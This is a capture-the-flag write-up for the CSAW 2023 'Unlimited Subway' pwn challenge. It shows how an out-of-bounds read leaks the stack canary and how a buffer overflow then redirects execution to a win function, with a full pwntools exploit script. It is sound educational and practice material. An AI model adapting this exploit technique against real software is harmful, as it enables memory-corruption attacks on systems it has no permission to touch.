<h3> Unlimited Subway </h3>

Hi, in this writeup I'll go through my approach in solving this pwn challenge which was from CSAW 2023 Prequal CTF

Let's get to it!

We're given a binary and on checking the file type & protections enabled I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c31331b3-cc63-48f4-aff0-3da6052f3524)

So we're working with a x86 binary which is dynamically linked, has debug information & not stripped

Ok so we're given a lot of information about this binary so what of the protections?

From the result when running `checksec` we can see that Canary is enabled

Hmmm let's run the binary to get an idea of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3a9c3264-7f6e-4f0a-a7d6-56218fed2b02)

We have 3 options and when we choose option 1 we can fill in account details while option 2 gives us the value of our given index in the account info and option 3 asks for a size then receives our input

To identify the vulnerability in this binary I decompiled it in IDA

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00a39bf2-1eb9-4047-be24-bf643fcfd0a2)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int idx; // [esp+4h] [ebp-90h] BYREF
  int name_len; // [esp+8h] [ebp-8Ch] BYREF
  char choice[2]; // [esp+Eh] [ebp-86h] BYREF
  unsigned __int8 account[64]; // [esp+10h] [ebp-84h] BYREF
  char name[64]; // [esp+50h] [ebp-44h] BYREF
  unsigned int v9; // [esp+90h] [ebp-4h]

  v9 = __readgsdword(0x14u);
  memset(account, 0, sizeof(account));
  memset(name, 0, sizeof(name));
  *(_WORD *)choice = 0;
  idx = 0;
  name_len = 0;
  init();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        print_menu();
        read(0, choice, 2);
        if ( choice[0] != 'F' )
          break;
        printf("Data : ");
        read(0, account, 64);
      }
      if ( choice[0] != 86 )
        break;
      printf("Index : ");
      __isoc99_scanf("%d", &idx);
      view_account(account, idx);
    }
    if ( choice[0] == 69 )
      break;
    puts("Invalid choice");
  }
  printf("Name Size : ");
  __isoc99_scanf("%d", &name_len);
  printf("Name : ");
  read(0, name, name_len);
  return 0;
}
```

I'll start my explanation from option `F`:
- It will read in at least 64 bytes of our input and store in the `account` variable, because the `account` variable can hold up to 64 bytes of data so there's no buffer overflow here

Option `V`:
- It reads in our index value and stores in variable `idx`
- Then it calls the `view_account` function passing our `account` and our `idx` value as the arguments

Here's the decompilation of the `view_account` function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b3eac468-845a-4e49-8b1f-d1e697d2fd57)

```c
void __cdecl view_account(unsigned __int8 *account, int idx)
{
  printf("Index %d : %02x\n", idx, account[idx]);
```

So basically what this does is to print out the value `account[idx]`, meaning the value of our provided index position in the array `account`

The last function which is `E` does this:

```c
  printf("Name Size : ");
  __isoc99_scanf("%d", &name_len);
  printf("Name : ");
  read(0, name, name_len);
  return 0;
}
```

Basically it will receive the length we want our name to be then use `read()` passing our provided length and storing in the `name` buffer

And the name buffer can only hold up 64 bytes this means we get a buffer overflow here

```c
char name[64]; // [esp+50h] [ebp-44h] BYREF
```

Looking at the functions available showed this win function which would just give us the flag when called
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1c1856a-960e-4fc4-9523-e06a06f32959)

```c
void print_flag()
{
  system("cat ./flag");
}
```

So our is obvious now we just need to exploit the buffer overflow to call this function

But the problem here is that there's Stack Canary in check meaning we need to bypass it

Let's first see the canary in action
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/03147c3d-ac32-455a-bc46-60af4755b342)

But if you want to know what exactly happens in the background let's check that too

I'll break at `main+18` cause that's where the canary initialize it's value which is going to be stored in `eax` before it's moved to `ebp-0x4`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6e848636-725b-4afc-954a-1a9e7d3261ae)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/153975b3-d3af-4088-9b2e-3ffeb6ee18b1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6b944d94-2e6b-4659-a5b7-3832c8a99480)

Now if we go to next instruction the value of the canary will be stored in the `eax` register
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a4fd97dd-000b-4f5c-b3fa-7536d602bee6)

```
$eax   : 0x1ceb8400
```

We can see the canary value to be `0x1ceb8400` and it's going to be random each time we execute the binary, another we can get the canary without having to break at that address is to just use `gef` feature by simplying typing `canary`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab843187-d514-42b6-8680-2fe64521d9eb)

Ok cool now the thing about this canary is that it's placed before the saved `ebp` and the `eip`, then if we overflow the buffer therefore we'll overwrite the canary value

But the issue is then before the program returns it will compare the canary value to see if it's still intact

And if it isn't we'll get the `Stack smashing detected` error

How can we go around this in this case?

Remember the function which allows us to choose an index position then gives us it's value from the account array well this can be exploited to do out of bound (OOB) read because the binary doesn't check if our index value is within the range of what the accounts is

This means we have arbitrary read of memory addresses what next?

Of cause at this point we want to leak the canary but how can we do that

Here's what I did,
- First I put a value in the fill in account function i.e AAAA
- Then I searched for the value and it happens to be on the stack
- Then I searched for the canary which is also on the stack
- I took the offset between this two values and divided by 8 (I thought it's supposed to be 4 cause x86 is 4 bytes alligned but that didn't work so I used 8)

So now we have the offset to where the canary is
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c4f8d291-7276-4965-a944-b9ad6e1f1a3f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6cd6b8b8-464e-4834-a93c-c480de1df1f2)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d275c677-ed1b-4113-a150-e0e5aa15dfdc)

Cool the offset is `-96`

To confirm it we can leak it 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0043fe2-36a1-4cc9-a563-524c1c76ae82)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac61998d-852c-4d23-a127-3a66f09795ba)

We can see it is indeed at offset `-96 --> -93`

Also note that the `view_account` function will just let us view one byte at a time so we need to call it 4 times with the right index because canary is 4 bytes (or rather x86 is 4 bytes alligned)

At this point we have a way to leak the canary now what?

Well we can do this:
- Overwrite the canary with it's value which is at offset 64 cause that's the amount of bytes our buffer can hold
- Overwrite the saved rbp with junk 4 bytes
- Overwrite the return address to the win function address

Here's my exploit script:

```python
from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *view_account+26
continue
'''.format(**locals())

# Binary filename
exe = './unlimited_subway'
elf = context.binary = ELF(exe, checksec=False)
# context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'info'
filterwarnings("ignore")


io = start()

# Canary ends at offset -96
leaked = []

for i in range(-96, -92):
    io.recvuntil('>')
    io.sendline('V')
    io.recvuntil('Index :')
    io.sendline(str(i))
    io.recvuntil(f'Index {i} :')
    leak = io.recvline().decode().split()
    leaked.append(leak[0])

canary = int("".join(leaked[::-1]), 16)
info("Canary: %#x", canary)

offset = 64

payload = flat({
    offset: [
        canary,
        b'A'*4,
        elf.sym['print_flag']
    ]
})

io.sendline('>')
io.sendline('E')
io.recvuntil('Size :')
io.sendline(str(0xff))
io.recvuntil('Name :')
io.sendline(payload)

io.interactive()
```

Running it works!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/27a85a49-4a1c-479a-bf2f-a2113beebf5e)
















